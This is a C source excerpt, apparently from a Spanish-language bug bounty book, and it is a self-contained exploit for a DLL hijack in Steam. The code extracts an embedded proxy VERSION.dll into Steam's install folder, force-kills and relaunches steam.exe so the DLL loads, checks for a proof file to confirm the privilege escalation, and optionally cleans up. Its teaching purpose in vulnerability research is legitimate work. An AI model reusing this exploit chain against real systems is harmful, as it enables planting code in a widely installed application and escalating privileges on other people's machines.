// Extraído de: LibroBugBounty/cap-21-caso-steam.md
/**
 * Exploit autocontenido para Steam DLL hijack.
 * 1. Extrae VERSION.dll proxy embebida
 * 2. Mata steam.exe
 * 3. Relanza steam.exe
 * 4. Verifica ejecucion
 * 5. Limpia automaticamente
 */
int main(int argc, char *argv[]) {
    // Extraer DLL embebida a directorio de Steam
    extract_resource(IDR_VERSION_DLL,
        "C:\\Program Files (x86)\\Steam\\VERSION.dll");

    // Matar Steam
    system("taskkill /f /im steam.exe >nul 2>&1");
    Sleep(2000);

    // Relanzar
    ShellExecuteA(NULL, "open",
        "C:\\Program Files (x86)\\Steam\\steam.exe",
        NULL, NULL, SW_SHOW);
    Sleep(5000);

    // Verificar
    if (file_exists("C:\\Users\\Public\\steam_lpe_proof.txt")) {
        printf("[+] EXPLOIT CONFIRMADO\n");
    }

    // Limpiar (opcional)
    if (argc < 2 || strcmp(argv[1], "--no-cleanup")) {
        DeleteFileA(
            "C:\\Program Files (x86)\\Steam\\VERSION.dll");
    }
    return 0;
}
